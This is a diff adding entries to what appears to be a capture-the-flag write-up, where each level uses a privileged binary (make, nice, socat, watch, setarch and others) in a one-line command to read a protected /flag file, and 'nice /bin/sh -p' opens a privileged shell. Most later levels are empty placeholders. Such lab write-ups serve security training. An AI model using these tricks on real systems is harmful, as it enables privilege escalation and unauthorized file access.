@@ -119,3 +119,147 @@ $ zip test2.zip /flag && unzip -c test2.zip
 ```bash
 $ tar -cf test.tar /flag && tar -xf test.tar -O
 ```
+
+### level 23 - genisoimage
+
+```bash
+$ genisoimage -sort /flag 
+```
+
+### level 26 - make
+
+```bash
+$ make -s --eval=$'x:\n\t-'"cat /flag"
+```
+
+### level 27 - nice
+
+```bash
+$ nice /bin/sh -p
+```
+
+### level 28 - timeout
+
+```bash
+$ timeout 1 cat /flag
+```
+
+### level 29 - stdbuf
+
+```bash
+$ stdbuf --output=L cat /flag
+```
+
+### level 30 - setarch
+
+```bash
+$ setarch x86_64 cat /flag
+```
+
+### level 31 - watch
+
+```bash
+$ watch -x cat /flag
+```
+
+### level 32 - socat
+
+```bash
+$ socat -u EXEC:'cat /flag' STDOUT
+```
+
+### level 33 - whiptail 
+
+```bash
+$ whiptail --textbox "/flag" 50 50 
+```
+
+### level 34 - awk
+
+```bash
+$ 
+```
+
+### level 35 - sed
+
+```bash
+$ 
+```
+
+### level 36 - ed
+
+```bash
+$ 
+```
+
+### level 37 - chown
+
+```bash
+$ 
+```
+
+### level 38 - chmod
+
+```bash
+$ 
+```
+
+### level 39 - cp
+
+```bash
+$ 
+```
+
+### level 41 - perl 
+
+```bash
+$ 
+```
+
+### level 42 - python
+
+```bash
+$ 
+```
+
+### level 45 - date
+
+```bash
+$ 
+```
+
+### level 46 - dmesg
+
+```bash
+$ 
+```
+
+### level 47 - wc
+
+```bash
+$ 
+```
+
+### level 48 - gcc
+
+```bash
+$ 
+```
+
+### level 49 - as
+
+```bash
+$ 
+```
+
+### level 50 - wget
+
+```bash
+$ 
+```
+
+### level 51 - ssh-keygen
+
+```bash
+$ 
+```
